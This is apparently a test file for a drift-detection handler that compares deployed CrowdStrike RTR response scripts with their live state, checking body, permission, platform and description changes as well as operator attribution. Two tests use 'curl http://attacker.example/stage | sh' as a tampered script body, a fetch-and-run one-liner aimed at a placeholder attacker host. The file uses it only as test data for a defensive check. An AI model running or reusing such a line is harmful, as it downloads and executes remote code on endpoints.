// driftDetect for rtr-response-scripts.
//
// The shared contract covers the invariants: drift never writes, a deleted
// script is critical drift, and a 500 is never reported as the script being
// gone. What is specific here is the comparison itself — permission_type (who
// may run it), platform, description, and the script body, which is compared
// only when GET actually returned it and is reported as a summary rather than
// echoed into the diff.
//
// NOT ASSERTED, deliberately: what this handler returns when GET omits
// `content`. It skips the body comparison entirely and the run comes back
// `hasDrift: false` with no `checked: false`, which the platform reads as a
// positive "I checked the script body and it matches". Asserting the current
// behaviour would bless that; it is in the accompanying report instead.

import test from 'node:test'
import assert from 'node:assert/strict'
import driftDetect from '../driftDetect'
import {
  CLIENT_ID,
  TOKEN,
  driftContext,
  entityPage,
  idsPage,
  item,
  recordFetch,
  writeCalls,
} from '../../../lib/__tests__/fakeFalcon'
import { registerDriftContract } from '../../../lib/__tests__/falconContracts'

const SCRIPT_BODY = 'Get-Process | Export-Csv -Path /tmp/procs.csv -NoTypeInformation'

const SCRIPT = item('Collect forensics', {
  name: 'collect-forensics',
  description: 'Collects volatile forensic artefacts',
  platform: 'windows',
  permissionType: 'group',
  content: SCRIPT_BODY,
})

registerDriftContract({ label: 'rtr-response-scripts', handler: driftDetect, items: [SCRIPT] })

/** The live script exactly matching the canvas, overridable field by field. */
const live = (over: Record<string, unknown> = {}) => ({
  id: 'scr-live-1',
  name: 'collect-forensics',
  description: 'Collects volatile forensic artefacts',
  platform: ['windows'],
  permission_type: 'group',
  content: SCRIPT_BODY,
  ...over,
})

/** The two-call lookup every entity-adapter read performs: id query, then get. */
function lookup(entity: Record<string, unknown> | null) {
  return entity === null
    ? [TOKEN, { status: 200, body: { resources: [] } }]
    : [TOKEN, idsPage([String(entity.id)]), entityPage([entity])]
}

test('rtr-response-scripts driftDetect: reports no drift when the tenant matches', async () => {
  const { calls, restore } = recordFetch(lookup(live()))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    assert.equal(result.hasDrift, false, `unexpected diffs: ${JSON.stringify(result.diffs)}`)
    assert.deepEqual(result.diffs, [])
    assert.equal(writeCalls(calls).length, 0)
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: reports a script body rewritten in the console', async () => {
  // This is code that runs on endpoints with the sensor's privilege — a body
  // swapped by hand is the change this check exists to catch.
  const { restore } = recordFetch(lookup(live({ content: 'curl http://attacker.example/stage | sh' })))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    assert.equal(result.hasDrift, true)
    const diff = result.diffs.find((d) => d.field === 'collect-forensics.content')
    assert.ok(diff, `expected a content diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.severity, 'warning')
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: never echoes either script body into a diff', async () => {
  // Drift records are stored and surfaced widely; neither the declared body nor
  // whatever replaced it belongs in one.
  const { restore } = recordFetch(lookup(live({ content: 'curl http://attacker.example/stage | sh' })))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    const serialised = JSON.stringify(result.diffs)
    assert.equal(serialised.includes('Export-Csv'), false, 'the declared body leaked into a diff')
    assert.equal(serialised.includes('attacker.example'), false, 'the live body leaked into a diff')
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: reports a script made public in the console', async () => {
  // permission_type decides who in the tenant may run the script at all.
  const { restore } = recordFetch(lookup(live({ permission_type: 'public' })))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    const diff = result.diffs.find((d) => d.field === 'collect-forensics.permissionType')
    assert.ok(diff, `expected a permissionType diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.expected, 'group')
    assert.equal(diff.actual, 'public')
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: reports a script retargeted at another platform', async () => {
  const { restore } = recordFetch(lookup(live({ platform: ['linux'] })))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    const diff = result.diffs.find((d) => d.field === 'collect-forensics.platform')
    assert.ok(diff, `expected a platform diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.expected, 'windows')
    assert.equal(diff.actual, 'linux')
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: accepts a bare-string platform from an older response shape', async () => {
  const { restore } = recordFetch(lookup(live({ platform: 'Windows' })))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    assert.equal(
      result.diffs.some((d) => d.field === 'collect-forensics.platform'),
      false,
      `a string platform is not drift: ${JSON.stringify(result.diffs)}`,
    )
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: reports a description edited in the console as informational', async () => {
  const { restore } = recordFetch(lookup(live({ description: 'edited by hand' })))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    const diff = result.diffs.find((d) => d.field === 'collect-forensics.description')
    assert.ok(diff, `expected a description diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.severity, 'info')
    assert.equal(diff.actual, 'edited by hand')
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: attributes a manual change to the operator who made it', async () => {
  const { restore } = recordFetch(
    lookup(
      live({
        permission_type: 'public',
        modified_by: 'alice@acme.com',
        modified_timestamp: '2026-01-04T10:00:00Z',
      }),
    ),
  )
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    const diff = result.diffs.find((d) => d.field === 'collect-forensics.permissionType')
    assert.ok(diff)
    assert.equal(diff.actor?.email, 'alice@acme.com')
    assert.equal(diff.actor?.at, '2026-01-04T10:00:00Z')
    assert.equal(diff.actor?.source, 'crowdstrike-audit')
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: does not attribute drift to our own API client', async () => {
  // A change last written by the connection's own API client is a Veltrix
  // deploy, not a manual edit — reporting it as one sends an operator hunting.
  const { restore } = recordFetch(lookup(live({ permission_type: 'public', modified_by: CLIENT_ID })))
  try {
    const result = await driftDetect(driftContext([SCRIPT]))

    const diff = result.diffs.find((d) => d.field === 'collect-forensics.permissionType')
    assert.ok(diff, 'the drift itself is still reported')
    assert.equal(diff.actor, undefined, 'our own deploy must not be attributed as a manual change')
  } finally {
    restore()
  }
})

test('rtr-response-scripts driftDetect: reads the DEPLOYED config, not the current canvas', async () => {
  // Drift compares the tenant against what was last deployed. An edit the
  // operator has made on the canvas but not yet deployed is not drift.
  const edited = item('Collect forensics', {
    name: 'collect-forensics',
    description: 'Collects volatile forensic artefacts',
    platform: 'windows',
    permissionType: 'public',
    content: SCRIPT_BODY,
  })
  const { restore } = recordFetch(lookup(live()))
  try {
    const result = await driftDetect(driftContext([SCRIPT], { canvasItems: [edited] }))

    assert.equal(result.hasDrift, false, `compared against the canvas: ${JSON.stringify(result.diffs)}`)
  } finally {
    restore()
  }
})
